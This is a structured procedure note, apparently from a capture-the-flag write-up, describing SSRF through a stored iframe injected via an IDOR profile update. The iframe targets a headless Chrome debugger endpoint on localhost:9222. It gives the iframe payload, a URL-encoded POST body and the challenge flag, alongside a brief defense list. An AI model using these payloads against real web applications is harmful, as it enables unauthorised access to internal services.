---
id: h8i9j0k1-l2m3-4567-hijk-890123456789
tags:
  - ssrf
  - port-scanning
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:33:06.250Z'
skill_level: advanced
impact_level: critical
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# SSRF-via-Injected-Iframe-to-Headless-Chrome-Debugger

## Summary

This procedure uses a stored iframe injection in the user name field to perform SSRF against the headless Chrome debugger port (9222), enabling port scanning and access to internal resources like secret documents.

## Description

Lack of iframe src sanitization allows <iframe src='http://localhost:9222/json'></iframe> to be stored via IDOR update. When rendered in an agent's or internal view (user agent reveals headless Chrome), the browser makes requests to internal ports. The /json endpoint exposes debugging info, allowing enumeration of open ports and fetching sensitive files, such as the flag document.

## Requirements

1. Stored injection capability (via previous XSS/IDOR)
2. Internal service on port 9222 (headless Chrome)
3. Profile view context for rendering

## Defense

Defensive measures and detection strategies:

- Sanitize HTML attributes like src in user data
- Disable iframe support or restrict src to external whitelists
- Firewall internal ports from browser contexts
- Monitor Chrome debugger access logs

## Objectives

1. Request internal endpoints via browser
2. Scan ports and discover services
3. Retrieve sensitive internal data

## Instructions

### Step 1: Craft Iframe Payload

**Context**: Target the debugger port.

Use <iframe src='http://localhost:9222/json' width=900 height=900></iframe>.

### Step 2: Inject and Store

**Context**: Use IDOR to persist iframe.

POST name=<iframe src='http://localhost:9222/json'...>&user_id=6&...

```http
name=%3Ciframe%20src%3D%27http%3A%2F%2Flocalhost%3A9222%2Fjson%27%20width%3D900%20height%3D900%3E%3C%2Fiframe%3E&email=...&user_id=6&_csrf_token=987d
```

> Iframe stored. Expected output: Update success.

### Step 3: Render and Exploit

**Context**: Trigger SSRF on view.

View the profile; iframe loads /json, revealing tabs and ports.

> Access secret doc with flag h1ctf{y3s_1m_c0sm1c_n0w}.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery
- [[Collection]] Collection

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- ssrf
- port-scanning
